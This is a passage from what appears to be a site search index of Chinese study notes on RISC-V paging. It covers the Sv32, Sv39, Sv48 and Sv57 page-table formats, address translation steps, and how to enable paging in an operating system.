<p>\u4e0a\u56fe\u662f\u4f7f\u7528\u4e8c\u7ea7\u9875\u8868\u7684\u7ffb\u8bd1\u8fc7\u7a0b\u3002\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u60c5\u51b5\uff0c\u5373\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e00\u7ea7\u9875\u8868\uff08superpage\uff09\uff0c\u5f53\u7b2c\u4e00\u7ea7\u9875\u8868\u7684 RWX \u4e0d\u5168\u4e3a 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u9875\u8868\u9879\u662f\u53f6\u9875\u8868\u9879\uff0c\u6b64\u65f6\u4f1a\u5224\u65ad PPN[0] \u7684\u503c\uff0c\u5982\u679c\u4e0d\u5168\u4e3a 0 \u5219\u629b\u51fa\u5f02\u5e38\u3002\u7136\u540e\u5728\u7ffb\u8bd1\u65f6 PPN[1] \u4fdd\u7559\uff0cVPN[0] \u5e76\u5165 page offset\uff1a</p> <p> </p> \u6587\u6863\u4e2d\u5bf9\u4e8e\u5730\u5740\u7ffb\u8bd1\u7684\u8be6\u7ec6\u63cf\u8ff0 <p>\u8bb0\u5f85\u7ffb\u8bd1\u7684\u865a\u62df\u5730\u5740\u4e3a va\uff0c\u7ed3\u679c\u7684\u7269\u7406\u5730\u5740\u4e3a pa</p> <ol> <li>\u4ee4 a = satp.PPN &lt;&lt; 12\uff0ci = 1</li> <li>\u4ee4 pte = *(a + (va.VPN[i] &lt;&lt; 2))<ul> <li>\u5982\u679c pte \u7684\u8bbf\u95ee\u8fc7\u7a0b\u4e2d\u8fdd\u53cd\u4e86 PMA \u6216 PMP \u7684\u68c0\u67e5\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Access Fault \u5f02\u5e38</li> </ul> </li> <li>\u5982\u679c pte.V = 0 \u6216\u8005\uff08pte.R = 0 \u4e14 pte.W = 1\uff09\u6216\u8005\u5176\u4ed6\u4fdd\u7559\u4f4d\u6ca1\u6709\u7f6e 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u76ee\u524d pte \u662f\u5408\u6cd5\u7684\u3002\u5982\u679c pte.R = 1 \u6216 pte.X = 1\uff08\u5373\u4e0d\u5168\u4e3a 0\uff09\u5219\u8df3\u5230\u7b2c 6 \u6b65</li> <li>\u76ee\u524d pte \u6307\u5411\u4e0b\u4e00\u7ea7\u9875\u8868\u3002\u4ee4 i = i - 1\uff0ca = pte.PPN &lt;&lt; 12\uff0c\u8df3\u5230\u7b2c 2 \u6b65<ul> <li>\u5982\u679c i &lt; 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> </ul> </li> <li>\u76ee\u524d pte \u662f\u4e00\u4e2a\u53f6\u9875\u8868\u9879\u3002\u6839\u636e pte.R/W/X/U\u3001\u5f53\u524d\u7279\u6743\u7ea7\u3001SUM MXR \u4f4d\u5224\u65ad\u5f53\u524d\u8bbf\u95ee\u6743\u9650\u662f\u5426\u5408\u6cd5\uff0c\u4e0d\u5408\u6cd5\u5219\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u5982\u679c i &gt; 0 \u4e14 pte.PPN[i-1:0] != 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage \u4e14\u6ca1\u5bf9\u9f50\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u4e0e pte.A pte.D \u6709\u5173\u7684\u4e00\u4e9b\u6ca1\u7ec6\u770b</li> <li>\u7ffb\u8bd1\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u586b\u5199\u8f6c\u6362\u540e\u7684\u7269\u7406\u5730\u5740<ul> <li>pa.pgoff = va.pgoff</li> <li>\u5982\u679c i &gt; 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage translation\uff0c\u4ee4 pa.PPN[i-1:0] = va.VPN[i-1:0]<ul> <li>\u5373\u6269\u5145 offset \u7684\u8303\u56f4</li> </ul> </li> <li>pa.PPN[1:i] = pte.PPN[1:i]</li> </ul> </li> </ol>"},{"location":"cs/pl/riscv/paging/#sv39","title":"Sv39 \u5206\u9875\u6a21\u5f0f","text":"<p>Sv39 \u6a21\u5f0f\u89c4\u5b9a\u865a\u62df\u5730\u5740\u4e3a 39 \u4f4d\uff0c\u7269\u7406\u5730\u5740\u4e3a 56 \u4f4d\u3002\u4e14\u865a\u62df\u5730\u5740\u7684\u9ad8 [63:39] \u4f4d\u5fc5\u987b\u548c 38 \u4f4d\u4fdd\u6301\u4e00\u81f4\uff0c\u5426\u5219\u4f1a\u89e6\u53d1 Page Fault\u3002\u865a\u62df\u5730\u5740\u6709 27 \u4f4d VPN\uff0c\u901a\u8fc7\u4e09\u7ea7\u9875\u8868\u8f6c\u6362\u4e3a 44 \u4f4d PPN\uff0c\u5269\u4e0b\u7684 12 \u4f4d\u4e3a offset \u4e0d\u53d8\u3002\u865a\u62df\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p>\u4e0b\u9762 index \u540e\u9762\u6709 ... \u7684\u8868\u793a\u8fd9\u90e8\u5206\u6ca1\u6709\u6309\u7167\u5b9e\u9645\u957f\u5ea6\u6bd4\u4f8b\u6765</p> 38 30 29 21 20 12 11 0 VPN[2] VPN[1] VPN[0] page offset 55... 30 29 21 20 12 11 0 PPN[2] PPN[1] PPN[0] page offset <p>Sv39 \u6bcf\u4e2a\u9875\u8868\u6709 2^9=512 \u4e2a\u9875\u8868\u9879\uff0c\u6bcf\u4e2a\u9875\u8868\u9879\u6709 8 \u5b57\u8282\uff0c\u56e0\u6b64\u6bcf\u4e2a\u9875\u8868\u540c\u6837\u4e3a 4KiB \u5927\u5c0f\uff0c\u4e14\u5fc5\u987b\u5bf9\u9f50\u3002\u5176\u4e2d\u6bcf\u4e2a\u9875\u8868\u9879\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> 63 62 61 60... 54 53... 28 27... 19 18... 10 9 8 7 6 5 4 3 2 1 0 N PBMT PPN[2] PPN[1] PPN[0] RSW D A G U X W R V <p>\u5176\u4e2d\uff1a</p> <ul> <li>\u9ad8\u4f4d\u4e09\u90e8\u5206\u4fdd\u7559\uff0c\u5982\u679c\u6709\u4e0d\u4e3a 0 \u7684\u5219\u629b\u51fa Page Fault \u5f02\u5e38<ul> <li>N \u4fdd\u7559\u7ed9 Svnapot \u6269\u5c55\uff0c\u6ca1\u5b9e\u73b0\u7684\u8bdd\u5fc5\u987b\u4e3a 0</li> <li>PBMT \u4fdd\u7559\u7ed9 Svpbmt \u6269\u5c55\uff0c\u6ca1\u5b9e\u73b0\u7684\u8bdd\u5fc5\u987b\u4e3a 0</li> <li>[60:54] \u4f4d\u4fdd\u7559\u7ed9\u540e\u7eed\u6807\u51c6\u4f7f\u7528\uff0c\u76ee\u524d\u5fc5\u987b\u4e3a 0</li> </ul> </li> <li>PPN[2] PPN[1] PPN[0] \u4e3a\u7269\u7406\u9875\u53f7</li> <li>\u540e\u9762\u7684\u6807\u8bc6\u4f4d\u548c Sv32 \u4e00\u6837</li> </ul> <p>\u5730\u5740\u7ffb\u8bd1\u8fc7\u7a0b\u548c Sv32 \u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u7ea7\u9875\u8868\u3002\u800c\u4e14 Sv39 \u7684\u6bcf\u4e00\u7ea7\u9875\u8868\u9879\u4e5f\u90fd\u53ef\u4ee5\u662f\u53f6\u9875\u8868\u9879\uff0c\u540c\u6837\u9875\u8868\u9879\u540e\u7eed\u7684 PPN \u5fc5\u987b\u662f 0 \u5426\u5219\u89c6\u4e3a\u672a\u5bf9\u9f50\u629b\u51fa Page Fault \u5f02\u5e38\u3002\u56e0\u6b64 Sv39 \u652f\u6301 4KiB \u7c92\u5ea6\u7684\u5206\u9875 pages\u30012MiB \u7c92\u5ea6\u7684\u5206\u9875 megapages \u548c 1GiB \u7c92\u5ea6\u7684\u5206\u9875 gigapages\u3002\u5176\u4e2d\u4f7f\u7528\u4e09\u7ea7\u9875\u8868\u7684\u5730\u5740\u7ffb\u8bd1\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <p> </p> <p>\u53ea\u4f7f\u7528\u4e8c\u7ea7\u9875\u8868\u548c\u4e00\u7ea7\u9875\u8868\u7684 megapages \u548c gigapages \u4e5f\u4e0d\u96be\u7406\u89e3\uff0c\u5176\u5b9e\u5c31\u76f8\u5f53\u4e8e page offset \u5411\u4e0a\u6269\u5145\u8986\u76d6\u5230\u4e86 VPN[0] \u6216 VPN[1]\uff0c\u8fd9\u91cc\u5c31\u4e0d\u753b\u4e86\u3002</p> \u6587\u6863\u4e2d\u5bf9\u4e8e\u5730\u5740\u7ffb\u8bd1\u7684\u8be6\u7ec6\u63cf\u8ff0 <p>\u8bb0\u5f85\u7ffb\u8bd1\u7684\u865a\u62df\u5730\u5740\u4e3a va\uff0c\u7ed3\u679c\u7684\u7269\u7406\u5730\u5740\u4e3a pa</p> <ol> <li>\u4ee4 a = satp.PPN &lt;&lt; 12\uff0ci = 2</li> <li>\u4ee4 pte = *(a + (va.VPN[i] &lt;&lt; 3))<ul> <li>\u5982\u679c pte \u7684\u8bbf\u95ee\u8fc7\u7a0b\u4e2d\u8fdd\u53cd\u4e86 PMA \u6216 PMP \u7684\u68c0\u67e5\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Access Fault \u5f02\u5e38</li> </ul> </li> <li>\u5982\u679c pte.V = 0 \u6216\u8005\uff08pte.R = 0 \u4e14 pte.W = 1\uff09\u6216\u8005\u5176\u4ed6\u4fdd\u7559\u4f4d\u6ca1\u6709\u7f6e 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u76ee\u524d pte \u662f\u5408\u6cd5\u7684\u3002\u5982\u679c pte.R = 1 \u6216 pte.X = 1\uff08\u5373\u4e0d\u5168\u4e3a 0\uff09\u5219\u8df3\u5230\u7b2c 6 \u6b65</li> <li>\u76ee\u524d pte \u6307\u5411\u4e0b\u4e00\u7ea7\u9875\u8868\u3002\u4ee4 i = i - 1\uff0ca = pte.PPN &lt;&lt; 12\uff0c\u8df3\u5230\u7b2c 2 \u6b65<ul> <li>\u5982\u679c i &lt; 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> </ul> </li> <li>\u76ee\u524d pte \u662f\u4e00\u4e2a\u53f6\u9875\u8868\u9879\u3002\u6839\u636e pte.R/W/X/U\u3001\u5f53\u524d\u7279\u6743\u7ea7\u3001SUM MXR \u4f4d\u5224\u65ad\u5f53\u524d\u8bbf\u95ee\u6743\u9650\u662f\u5426\u5408\u6cd5\uff0c\u4e0d\u5408\u6cd5\u5219\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u5982\u679c i &gt; 0 \u4e14 pte.PPN[i-1:0] != 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage \u4e14\u6ca1\u5bf9\u9f50\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u4e0e pte.A pte.D \u6709\u5173\u7684\u4e00\u4e9b\u6ca1\u7ec6\u770b</li> <li>\u7ffb\u8bd1\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u586b\u5199\u8f6c\u6362\u540e\u7684\u7269\u7406\u5730\u5740<ul> <li>pa.pgoff = va.pgoff</li> <li>\u5982\u679c i &gt; 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage translation\uff0c\u4ee4 pa.PPN[i-1:0] = va.VPN[i-1:0]<ul> <li>\u5373\u6269\u5145 offset \u7684\u8303\u56f4</li> </ul> </li> <li>pa.PPN[2:i] = pte.PPN[2:i]</li> </ul> </li> </ol>"},{"location":"cs/pl/riscv/paging/#sv48","title":"Sv48 \u5206\u9875\u6a21\u5f0f","text":"<p>Sv39 \u63d0\u4f9b\u7684 39 \u4f4d\u865a\u62df\u5730\u5740\u53ef\u80fd\u4f1a\u4e0d\u591f\u7528\uff0c\u6240\u4ee5\u6269\u5c55\u5f97\u5230\u4e86 Sv48 \u6a21\u5f0f\uff0c\u5728 Sv39 \u57fa\u7840\u4e0a\u52a0\u4e86\u4e00\u7ea7\u9875\u8868\uff0c\u4e3a\u865a\u62df\u5730\u5740\u9ad8\u4f4d\u591a\u52a0\u4e86 9 \u4f4d\u7684 VPN[3]\uff0c\u5c06\u7269\u7406\u5730\u5740 26 \u4f4d\u7684 PPN[2] \u5206\u4e3a\u4e86 17 \u4f4d\u7684 PPN[3] \u548c 9 \u4f4d\u7684 PPN[2]\uff1a</p> 47 39 38 30 29 21 20 12 11 0 VPN[3] VPN[2] VPN[1] VPN[0] page offset 55... 39 38 30 29 21 20 12 11 0 PPN[3] PPN[2] PPN[1] PPN[0] page offset <p>\u4f7f\u7528\u56db\u7ea7\u9875\u8868\uff0c\u6bcf\u4e2a\u9875\u8868\u5185\u9875\u8868\u9879\u6570\u91cf\u548c\u957f\u5ea6\u90fd\u6ca1\u6709\u53d8\u5316\uff0c\u9875\u8868\u9879\u5185\u5bb9\u4e5f\u53ea\u662f\u4ece PPN[2] \u62c6\u5206\u51fa\u4e86 PPN[3]\uff1a</p> 63 62 61 60... 54 53... 37 36... 28 27... 19 18... 10 9 8 7 6 5 4 3 2 1 0 PPN[3] PPN[2] PPN[1] PPN[0] RSW D A G U X W R V <p>\u5730\u5740\u7684\u7ffb\u8bd1\u8fc7\u7a0b\u4e5f\u7c7b\u4f3c\uff0c\u53ea\u662f\u53ef\u80fd\u4f1a\u591a\u4e00\u7ea7\u67e5\u8be2\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002</p> <p>\u540c\u6837\u6bcf\u4e00\u7ea7\u9875\u8868\u9879\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u53f6\u9875\u8868\u9879\uff0c\u56e0\u6b64 Sv48 \u7684\u5206\u9875\u652f\u6301\u56db\u79cd\u7c92\u5ea6 4KiB pages\u30012MiB megapages\u30011GiB gigapages \u548c 512GiB terapages\u3002</p> \u6587\u6863\u4e2d\u5bf9\u4e8e\u5730\u5740\u7ffb\u8bd1\u7684\u8be6\u7ec6\u63cf\u8ff0 <p>\u8bb0\u5f85\u7ffb\u8bd1\u7684\u865a\u62df\u5730\u5740\u4e3a va\uff0c\u7ed3\u679c\u7684\u7269\u7406\u5730\u5740\u4e3a pa</p> <ol> <li>\u4ee4 a = satp.PPN &lt;&lt; 12\uff0ci = 3</li> <li>\u4ee4 pte = *(a + (va.VPN[i] &lt;&lt; 3))<ul> <li>\u5982\u679c pte \u7684\u8bbf\u95ee\u8fc7\u7a0b\u4e2d\u8fdd\u53cd\u4e86 PMA \u6216 PMP \u7684\u68c0\u67e5\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Access Fault \u5f02\u5e38</li> </ul> </li> <li>\u5982\u679c pte.V = 0 \u6216\u8005\uff08pte.R = 0 \u4e14 pte.W = 1\uff09\u6216\u8005\u5176\u4ed6\u4fdd\u7559\u4f4d\u6ca1\u6709\u7f6e 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u76ee\u524d pte \u662f\u5408\u6cd5\u7684\u3002\u5982\u679c pte.R = 1 \u6216 pte.X = 1\uff08\u5373\u4e0d\u5168\u4e3a 0\uff09\u5219\u8df3\u5230\u7b2c 6 \u6b65</li> <li>\u76ee\u524d pte \u6307\u5411\u4e0b\u4e00\u7ea7\u9875\u8868\u3002\u4ee4 i = i - 1\uff0ca = pte.PPN &lt;&lt; 12\uff0c\u8df3\u5230\u7b2c 2 \u6b65<ul> <li>\u5982\u679c i &lt; 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> </ul> </li> <li>\u76ee\u524d pte \u662f\u4e00\u4e2a\u53f6\u9875\u8868\u9879\u3002\u6839\u636e pte.R/W/X/U\u3001\u5f53\u524d\u7279\u6743\u7ea7\u3001SUM MXR \u4f4d\u5224\u65ad\u5f53\u524d\u8bbf\u95ee\u6743\u9650\u662f\u5426\u5408\u6cd5\uff0c\u4e0d\u5408\u6cd5\u5219\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u5982\u679c i &gt; 0 \u4e14 pte.PPN[i-1:0] != 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage \u4e14\u6ca1\u5bf9\u9f50\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u4e0e pte.A pte.D \u6709\u5173\u7684\u4e00\u4e9b\u6ca1\u7ec6\u770b</li> <li>\u7ffb\u8bd1\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u586b\u5199\u8f6c\u6362\u540e\u7684\u7269\u7406\u5730\u5740<ul> <li>pa.pgoff = va.pgoff</li> <li>\u5982\u679c i &gt; 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage translation\uff0c\u4ee4 pa.PPN[i-1:0] = va.VPN[i-1:0]<ul> <li>\u5373\u6269\u5145 offset \u7684\u8303\u56f4</li> </ul> </li> <li>pa.PPN[3:i] = pte.PPN[3:i]</li> </ul> </li> </ol>"},{"location":"cs/pl/riscv/paging/#sv57","title":"Sv57 \u5206\u9875\u6a21\u5f0f","text":"<p>\u5728 Sv48 \u57fa\u7840\u4e0a\u53c8\u52a0\u4e86\u4e00\u7ea7\u9875\u8868\uff0c\u4e3a\u865a\u62df\u5730\u5740\u9ad8\u4f4d\u591a\u52a0\u4e86 9 \u4f4d\u7684 VPN[4]\uff0c\u5c06\u7269\u7406\u5730\u5740 17 \u4f4d\u7684 PPN[3] \u5206\u4e3a\u4e86 8 \u4f4d\u7684 PPN[4] \u548c 9 \u4f4d\u7684 PPN[3]\uff1a</p> 56 48 47 39 38 30 29 21 20 12 11 0 VPN[4] VPN[3] VPN[2] VPN[1] VPN[0] page offset 55 48 47 39 38 30 29 21 20 12 11 0 PPN[4] PPN[3] PPN[2] PPN[1] PPN[0] page offset <p>\u4f7f\u7528\u4e94\u7ea7\u9875\u8868\uff0c\u6bcf\u4e2a\u9875\u8868\u5185\u9875\u8868\u9879\u6570\u91cf\u548c\u957f\u5ea6\u90fd\u6ca1\u6709\u53d8\uff0c\u5185\u5bb9\u5dee\u522b\u548c\u7269\u7406\u5730\u5740\u540c\u6837\uff0c\u4ece PPN[3] \u4e2d\u62c6\u51fa\u4e86 PPN[4]\uff0c\u5177\u4f53\u5c31\u4e0d\u5c55\u793a\u4e86\u3002</p> <p>\u7ffb\u8bd1\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u540c\u6837\u6bcf\u4e00\u7ea7\u9875\u8868\u9879\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u53f6\u9875\u8868\u9879\uff0c\u56e0\u6b64 Sv57 \u7684\u5206\u9875\u652f\u6301\u4e94\u79cd\u7c92\u5ea6 4KiB pages\u30012MiB megapages\u30011GiB gigapages\u3001512GiB terapages \u548c 256TiB petapages\u3002</p> \u6587\u6863\u4e2d\u5bf9\u4e8e\u5730\u5740\u7ffb\u8bd1\u7684\u8be6\u7ec6\u63cf\u8ff0 <p>\u8bb0\u5f85\u7ffb\u8bd1\u7684\u865a\u62df\u5730\u5740\u4e3a va\uff0c\u7ed3\u679c\u7684\u7269\u7406\u5730\u5740\u4e3a pa</p> <ol> <li>\u4ee4 a = satp.PPN &lt;&lt; 12\uff0ci = 4</li> <li>\u4ee4 pte = *(a + (va.VPN[i] &lt;&lt; 3))<ul> <li>\u5982\u679c pte \u7684\u8bbf\u95ee\u8fc7\u7a0b\u4e2d\u8fdd\u53cd\u4e86 PMA \u6216 PMP \u7684\u68c0\u67e5\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Access Fault \u5f02\u5e38</li> </ul> </li> <li>\u5982\u679c pte.V = 0 \u6216\u8005\uff08pte.R = 0 \u4e14 pte.W = 1\uff09\u6216\u8005\u5176\u4ed6\u4fdd\u7559\u4f4d\u6ca1\u6709\u7f6e 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u76ee\u524d pte \u662f\u5408\u6cd5\u7684\u3002\u5982\u679c pte.R = 1 \u6216 pte.X = 1\uff08\u5373\u4e0d\u5168\u4e3a 0\uff09\u5219\u8df3\u5230\u7b2c 6 \u6b65</li> <li>\u76ee\u524d pte \u6307\u5411\u4e0b\u4e00\u7ea7\u9875\u8868\u3002\u4ee4 i = i - 1\uff0ca = pte.PPN &lt;&lt; 12\uff0c\u8df3\u5230\u7b2c 2 \u6b65<ul> <li>\u5982\u679c i &lt; 0\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> </ul> </li> <li>\u76ee\u524d pte \u662f\u4e00\u4e2a\u53f6\u9875\u8868\u9879\u3002\u6839\u636e pte.R/W/X/U\u3001\u5f53\u524d\u7279\u6743\u7ea7\u3001SUM MXR \u4f4d\u5224\u65ad\u5f53\u524d\u8bbf\u95ee\u6743\u9650\u662f\u5426\u5408\u6cd5\uff0c\u4e0d\u5408\u6cd5\u5219\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u5982\u679c i &gt; 0 \u4e14 pte.PPN[i-1:0] != 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage \u4e14\u6ca1\u5bf9\u9f50\uff0c\u629b\u51fa\u5bf9\u5e94\u8bbf\u95ee\u7c7b\u578b\u7684 Page Fault \u5f02\u5e38</li> <li>\u4e0e pte.A pte.D \u6709\u5173\u7684\u4e00\u4e9b\u6ca1\u7ec6\u770b</li> <li>\u7ffb\u8bd1\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u586b\u5199\u8f6c\u6362\u540e\u7684\u7269\u7406\u5730\u5740<ul> <li>pa.pgoff = va.pgoff</li> <li>\u5982\u679c i &gt; 0\uff0c\u8bf4\u660e\u5f53\u524d\u662f superpage translation\uff0c\u4ee4 pa.PPN[i-1:0] = va.VPN[i-1:0]<ul> <li>\u5373\u6269\u5145 offset \u7684\u8303\u56f4</li> </ul> </li> <li>pa.PPN[4:i] = pte.PPN[4:i]</li> </ul> </li> </ol>"},{"location":"cs/pl/riscv/paging/#_2","title":"\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5f00\u542f\u5206\u9875","text":"<p>\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5f00\u542f\u5206\u9875\u673a\u5236\uff0c\u5927\u4f53\u4e0a\u9700\u8981\u505a\u4ee5\u4e0b\u4e8b\u60c5\uff1a</p> <ul> <li>\u5206\u914d\u7269\u7406\u5730\u5740\u9875\uff0c\u6bcf\u9875\u4e2d\u5199\u597d\u9700\u8981\u6620\u5c04\u90e8\u5206\u7684\u9875\u8868\u9879<ul> <li>\u6ce8\u610f PTE \u6807\u8bc6\u4f4d\u7684\u6743\u9650\uff0c\u4ee5\u53ca PTE.V \u4f4d</li> </ul> </li> <li>\u5c06\u9875\u8868\u7684\u7269\u7406\u5730\u5740\u672b\u5c3e\u622a\u65ad\u5f97\u5230\u6839\u9875\u8868\u7269\u7406\u9875\u53f7</li> <li>\u540c\u5206\u9875\u6a21\u5f0f\u4e00\u8d77\u5199\u5165 satp \u5bc4\u5b58\u5668<ul> <li>\u5199\u5165\u7684\u540c\u65f6\u5c31\u5df2\u7ecf\u542f\u7528\u5206\u9875\u4e86\uff0c\u6240\u4ee5\u8981\u6ce8\u610f pc+4 \u662f\u5426\u4ecd\u7136\u53ef\u4ee5\u8bbf\u95ee</li> </ul> </li> <li>\u6267\u884c sfence.vma x0, x0 \u6307\u4ee4\uff0c\u5237\u65b0 TLB \u7f13\u5b58</li> </ul> <p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u4e3b\u8981\u7684\u95ee\u9898\uff0c\u8bbe\u7f6e satp \u5bc4\u5b58\u5668\u7684\u540c\u65f6\u5c31\u4f1a\u5f00\u542f\u5206\u9875\u673a\u5236\uff0c\u4f46\u540c\u65f6\u4e0d\u4f1a\u4fee\u6539 pc\uff0c\u6240\u4ee5\u5c31\u8981\u8003\u8651\u4e0b\u4e00\u6761\u6307\u4ee4\u8bfb\u53d6\u7684\u95ee\u9898\u3002\u5927\u6982\u6709\u4e24\u79cd\u5904\u7406\u65b9\u6cd5\uff1a</p> <ul> <li>\u63d0\u524d\u8bbe\u7f6e stvec \u4e3a\u8bbe\u7f6e satp \u4e4b\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u865a\u62df\u5730\u5740<ul> <li>\u8fd9\u6837\u5f00\u542f\u5206\u9875\u540e\u7ee7\u7eed\u6267\u884c\u4f1a\u4ea7\u751f\u5f02\u5e38\uff0c\u8df3\u8f6c\u5230 stvec \u5730\u5740\uff0c\u5728 S \u6001\u7ee7\u7eed\u6267\u884c</li> </ul> </li> <li>\u8fdb\u884c\u4e24\u6b21\u9875\u8868\u7684\u8bbe\u7f6e<ul> <li>\u7b2c\u4e00\u6b21\u8bbe\u7f6e\u4e34\u65f6\u9875\u8868\uff0c\u5c06\u4ee3\u7801\u6bb5\u540c\u65f6\u6620\u5c04\u5230\u9ad8\u4f4d\u7684\u865a\u62df\u5730\u5740\uff0c\u4ee5\u53ca\u5efa\u7acb\u4e00\u4e2a\u7b49\u503c\u6620\u5c04</li> <li>\u8bbe\u7f6e satp \u540e\u4ecd\u53ef\u4ee5\u901a\u8fc7\u7b49\u503c\u6620\u5c04\u6839\u636e\u7269\u7406\u5730\u5740\u8bbf\u95ee\u540e\u7eed\u6307\u4ee4</li> <li>\u540e\u7eed\u901a\u8fc7\u5c06 ra \u8bbe\u7f6e\u4e3a\u9ad8\u4f4d\u865a\u62df\u5730\u5740\u518d ret\uff0c\u8fd9\u65f6 pc \u5c31\u5f00\u59cb\u5728\u865a\u62df\u5730\u5740\u4e0a\u6267\u884c\u4e86</li> <li>\u7136\u540e\u518d\u5e03\u5c40\u5b8c\u6574\u7684\u9875\u8868\uff0c\u8bbe\u7f6e satp\uff0c\u6b64\u65f6\u5185\u6838\u6001\u7684\u865a\u62df\u5730\u5740\u6620\u5c04\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u8bbe\u7f6e\u540e pc \u4ecd\u53ef\u4ee5\u6b63\u5e38\u6267\u884c</li> </ul> </li> </ul> <p>\u5728 qemu \u5b9e\u9645\u8fd0\u884c\u4e2d\uff0c\u65e7\u7248 qemu\uff08\u8d77\u7801 7.0 \u4e4b\u524d\uff09\u5b9e\u6d4b\u4f1a\u6709\u95ee\u9898\uff0c\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u7684\u8bdd\uff0c\u5373\u4f7f\u4e0d\u8fdb\u884c\u7b49\u503c\u6620\u5c04\uff0cqemu \u4e5f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u540e\u7eed\u6307\u4ee4\uff0c\u4f46\u4e00\u65e6\u4f7f\u7528 gdb \u5355\u6b65\u8ddf\u8e2a\uff0c\u5c31\u4f1a\u5728\u8bbe\u7f6e satp \u540e\u7acb\u9a6c\u6302\u6389\uff08\u859b\u5b9a\u8c14\u7684\u4ee3\u7801\uff09\u3002\u5c1a\u4e0d\u6e05\u695a\u662f\u4ec0\u4e48\u539f\u56e0\uff0c\u59d1\u4e14\u6000\u7591\u662f qemu \u5bf9\u4e8e\u6307\u4ee4\u7f13\u5b58\u5904\u7406\u7684\u95ee\u9898\uff08ps\uff1a\u8fd9\u91cc\u5373\u4f7f\u8c03\u7528 fence.i \u6e05\u9664\u6307\u4ee4\u7f13\u5b58\u4e5f\u4e00\u6837\u53ef\u4ee5\u6267\u884c\uff09\u3002</p> <p>\u76f8\u5173\u95ee\u9898\u4ee5\u53ca\u4e00\u79cd patch\uff1a[PATCH] target/riscv: Exit current TB after an sfence.vma</p>"},{"location":"cs/pl/riscv/privileged/","title":"RISC-V \u7279\u6743\u7ea7 ISA\uff08\u57fa\u7840&amp;\u4e2d\u65ad\uff09","text":"<p> \u7ea6 4691 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p> <p>Abstract</p> <p>RISC-V \u6307\u4ee4\u96c6\u7684\u7279\u6743\u7ea7\u90e8\u5206\u3002\u8fd9\u91cc\u53ea\u5305\u542b\u90e8\u5206\u7279\u6743\u7ea7\u7684\u57fa\u7840\u4ecb\u7ecd\uff0c\u4ee5\u53ca\u4e2d\u65ad\u76f8\u5173\u7684\u7406\u89e3\u3002</p> 